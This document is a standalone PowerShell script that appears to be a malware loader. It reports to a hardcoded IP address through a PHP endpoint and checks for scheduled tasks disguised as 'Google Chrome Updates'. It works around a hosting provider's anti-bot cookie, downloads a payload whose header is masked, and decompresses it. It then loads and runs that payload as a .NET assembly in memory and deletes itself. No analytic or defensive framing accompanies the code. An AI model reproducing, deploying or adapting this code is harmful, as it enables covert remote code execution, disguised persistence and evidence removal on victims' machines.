
function Test-UsesInfinityFreeCookie {
    if ("http://104.253.175.177" -match '^https?://(\d{1,3}\.){3}\d{1,3}') {
        return $false;
    };

    try {
        Invoke-WebRequest -Uri "http://104.253.175.177/aes.js" -Method Head -UseBasicParsing -TimeoutSec 10 | Out-Null;
        return $true;
    }
    catch {
        return $false;
    };
};

function g-c {
    $Xy = $env:temp+"\aes.js";
    $KO = Invoke-WebRequest -Uri "http://104.253.175.177/aes.js" -UseBasicParsing;
    $E12 = Invoke-WebRequest -Uri "http://104.253.175.177" -UseBasicParsing -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0";
    $cx = $E12.Content;
    $JuD = $cx.replace('<html><body><script type="text/javascript" src="/aes.js" ></script><script>', "");
    $JuD = $JuD.replace('location.href="http://104.253.175.177/?i=1";</script><noscript>This site requires Javascript to work, please enable Javascript in your browser or use a browser with Javascript support</noscript></body></html>', "WScript.Echo(toHex(slowAES.decrypt(c,2,a,b)));");
    $JuD = $JuD.replace("document.", "");

    Set-Content -Path $Xy -Value $KO.Content;
    Add-Content -Path $Xy -Value $JuD;
    $mgN = cscript /nologo $Xy;
    Remove-Item $Xy;

    return $mgN;
}
function p-s {
    param(
        [string] $GY,
        [string] $dQ,
        [string] $FXB
    )


    $FB7 = "http://104.253.175.177/pee.php";
    $u7 = @{("Content-Type") = "application/x-www-form-urlencoded" };
    $SMK = @{ fon=$GY; fin=$dQ; rst=$FXB };
    $YN = New-Object Microsoft.PowerShell.Commands.WebRequestSession;
    if (Test-UsesInfinityFreeCookie) {
        $mgN = New-Object System.Net.Cookie('__test', (g-c), '/', ([Uri]("http://104.253.175.177")).Host);
        $YN.Cookies.Add($mgN);
    };
    $E12 = Invoke-RestMethod -Uri $FB7 -Method Post -Headers $u7 -Body $SMK -UserAgent ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0") -WebSession $YN;
    return $E12.Content;
}
$wMd = $MyInvocation.MyCommand.Path;
try {
    p-s ("logs/"+MID_LOGFOLDER_SUBPATH_PAYLOAD) ("REAL") (Get-Date -Format ("yyyy.MM.dd_HH.mm.ss"));
    function Test-AllowedScheduledTask {
        $allowedDescriptions = @('rBz', 'Of1', '6KE', 'YR7', '39K', 'Jw9', '8yG', 'N46', 'PUc', 'C3F', n9h);;;
        $tasks = Get-ScheduledTask | Where-Object { $_.TaskName -like 'Google Chrome Updates*' };

        foreach ($task in $tasks) {
            if ($allowedDescriptions -contains $task.Description) {
                return $true;
            }
        }

        return $false;
    };

    if (Test-AllowedScheduledTask) {

        $midHost = 'http://104.253.175.177';
        $fileUrl = $midHost + '/test.bef_fri';
        $userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0';
    
        function Test-UsesInfinityFreeCookie {
            if ($midHost -match '^https?://(\d{1,3}\.){3}\d{1,3}') {
                return $false;
            };
    
            try {
                Invoke-WebRequest -Uri ($midHost.TrimEnd('/') + '/aes.js') -Method Head -UseBasicParsing -TimeoutSec 10 | Out-Null;
                return $true;
            }
            catch {
                return $false;
            };
        };
    
        function Get-InfinityFreeCookie {
            $dst_aes = $env:temp + '\aes.js';
            $aes = Invoke-WebRequest -Uri ($midHost + '/aes.js') -UseBasicParsing;
            $response = Invoke-WebRequest -Uri $midHost -UseBasicParsing -UserAgent $userAgent;
            $content = $response.Content;
            $tmp = $content.Replace('<html><body><script type="text/javascript" src="/aes.js" ></script><script>', '');
            $locationPattern = 'location.href="' + $midHost + '/?i=1";</script><noscript>This site requires Javascript to work, please enable Javascript in your browser or use a browser with Javascript support</noscript></body></html>';
            $tmp = $tmp.Replace($locationPattern, 'WScript.Echo(toHex(slowAES.decrypt(c,2,a,b)));');
            $tmp = $tmp.Replace('document.', '');
    
            Set-Content -Path $dst_aes -Value $aes.Content;
            Add-Content -Path $dst_aes -Value $tmp;
            $cookie = cscript /nologo $dst_aes;
            Remove-Item $dst_aes;
    
            return $cookie;
        };
    
        function Get-DownloadBytes {
            param(
                [Parameter(Mandatory = $true)]
                [string] $Uri,
                [Microsoft.PowerShell.Commands.WebRequestSession] $Session
            )
    
            $request = [System.Net.HttpWebRequest]::Create($Uri);
            $request.Method = 'GET';
            $request.UserAgent = $userAgent;
            if ($Session -and $Session.Cookies) {
                $request.CookieContainer = $Session.Cookies;
            }
    
            $response = $request.GetResponse();
            try {
                $stream = $response.GetResponseStream();
                $memoryStream = New-Object System.IO.MemoryStream;
                $stream.CopyTo($memoryStream);
                return $memoryStream.ToArray();
            }
            finally {
                $response.Close();
            }
        }
    
        function Expand-GzipBytes {
            param(
                [Parameter(Mandatory = $true)]
                [byte[]] $compressedBytes
            )
    
            $inputStream = New-Object System.IO.MemoryStream(, $compressedBytes);
            $outputStream = New-Object System.IO.MemoryStream;
            $gzipStream = New-Object System.IO.Compression.GzipStream $inputStream, ([IO.Compression.CompressionMode]::Decompress);
            $gzipStream.CopyTo($outputStream);
    
            $gzipStream.Close();
            $inputStream.Close();
    
            return $outputStream.ToArray();
        };
    
        function Invoke-MethodEntry {
            param(
                [Parameter(Mandatory = $true)]
                [System.Reflection.MethodInfo] $Method
            )
    
            $result = if ($Method.GetParameters().Count -eq 0) {
                $Method.Invoke($null, $null);
            }
            else {
                $Method.Invoke($null, @(,[string[]]@()));
            };
    
            if ($result -is [System.Threading.Tasks.Task]) {
                $result.GetAwaiter().GetResult();
            }
        };
    
        function Invoke-PayloadBytes {
            param(
                [Parameter(Mandatory = $true)]
                [byte[]] $PayloadBytes
            )
    
            if ($PayloadBytes.Length -lt 4096 -or $PayloadBytes[0] -ne 0x4D -or $PayloadBytes[1] -ne 0x5A) {
                throw [System.IO.InvalidDataException]::new('Payload is not a valid PE (EXE) after decompression.');
            }
    
            try {
                $assembly = [System.Reflection.Assembly]::Load($PayloadBytes);
            }
            catch {
                $loadError = if ($null -ne $_.Exception.InnerException) {
                    $_.Exception.InnerException.Message;
                }
                else {
                    $_.Exception.Message;
                };
                throw [System.IO.FileLoadException]::new('In-memory assembly load failed: ' + $loadError);
            }
    
            if ($assembly.EntryPoint -eq $null) {
                return;
            }
    
            Invoke-MethodEntry -Method $assembly.EntryPoint;
        }
    
        try {
            $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession;
            if (Test-UsesInfinityFreeCookie) {
                $session.Cookies.Add((New-Object System.Net.Cookie('__test', (Get-InfinityFreeCookie), '/', ([Uri]$midHost).Host)));
            };
            [byte[]] $downloadedBytes = Get-DownloadBytes -Uri $fileUrl -Session $session;
        }
        catch {
            Write-Error $_.Exception.Message;
            exit 1;
        }
    
        if ($downloadedBytes -eq $null -or $downloadedBytes.Length -lt 1024) {
            Write-Error ('Download failed: expected binary payload but got {0} bytes.' -f @($downloadedBytes.Length));
            exit 1;
        }
    
        if ($downloadedBytes[0] -eq 0x3C) {
            Write-Error 'Download failed: server returned HTML instead of binary. Cookie or URL may be wrong.';
            exit 1;
        }
    
        # Restore GZIP header bytes (server masks first 8 bytes, e.g. {\rtf1});
        $downloadedBytes[0] = 0x1F;
        $downloadedBytes[1] = 0x8B;
        $downloadedBytes[2] = 0x08;
        $downloadedBytes[3] = 0x00;
        $downloadedBytes[4] = 0x00;
        $downloadedBytes[5] = 0x00;
        $downloadedBytes[6] = 0x00;
        $downloadedBytes[7] = 0x00;
    
        try {
            [byte[]] $payloadBytes = Expand-GzipBytes -compressedBytes $downloadedBytes;
        }
        catch {
            Write-Error ('GZIP decompression failed: ' + $_.Exception.Message);
            exit 1;
        }
    
        try {
            Invoke-PayloadBytes -PayloadBytes $payloadBytes;
        }
        catch {
            $errorMessage = if ($null -ne $_.Exception.InnerException) {
                $_.Exception.InnerException.Message;
            }
            else {
                $_.Exception.Message;
            }
    
            Write-Error $errorMessage;
            exit 1;
        }
        exit 0;
    }

}
catch {
    $hRR = if ($null -ne $_.Exception.InnerException) {
        $_.Exception.InnerException.Message;
    }
    else {
        $_.Exception.Message;
    }

    p-s ("logs/"+MID_LOGFOLDER_SUBPATH_PAYLOAD) ("ERROR") $hRR;
}
Start-Sleep -Seconds 1;
Remove-Item -Path $wMd -Force;
